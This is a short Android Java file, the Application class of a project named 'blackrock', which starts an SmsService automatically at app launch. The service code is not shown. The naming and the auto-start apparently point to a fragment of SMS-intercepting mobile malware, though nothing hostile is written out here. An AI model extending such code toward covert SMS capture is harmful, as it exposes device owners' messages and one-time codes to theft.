package com.voldy.blackrock;

import android.app.Application;
import android.content.Intent;

import com.voldy.blackrock.sms.SmsService;

public class App extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        startService(new Intent(this, SmsService.class));
    }
}
